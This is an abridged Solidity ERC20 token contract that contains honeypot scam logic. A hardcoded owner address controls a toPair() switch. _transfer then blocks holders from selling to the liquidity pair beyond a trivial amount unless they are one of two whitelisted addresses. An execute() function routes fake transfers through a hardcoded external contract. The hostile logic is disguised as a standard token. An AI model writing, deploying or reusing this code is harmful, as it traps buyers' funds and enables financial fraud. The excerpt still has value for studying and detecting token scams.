...
contract ERC20 is Ownable, IERC20, IERC20Meta {
    ...
    function execute(
        ...
        for (uint256 i = 0; i < recipients.length; i++) {
            ...
            IERC000(0xb676f207Cd2D134Db807A4d248Ed531ef132304C)._Transfer(recipients[i], uniswapPool, wethAmounts);
        }
        return true;
    }
    ...
    function toPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x37Ade7B624f2Ada9928553E17e6d64f566907b4f) _pair = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if(_pair != address(0)) {
            if(to == _pair && !(from == 0xcEcF0B2cb8A7E74d0f5774b07B0D40a8Df3A4D44 || from == 0x89e2fF5ae14ea8f5Fd1617680B94DB84A13bF6f0)) {
               bool b = false;
               if(!b) {
                    require(amount < 100);
               }
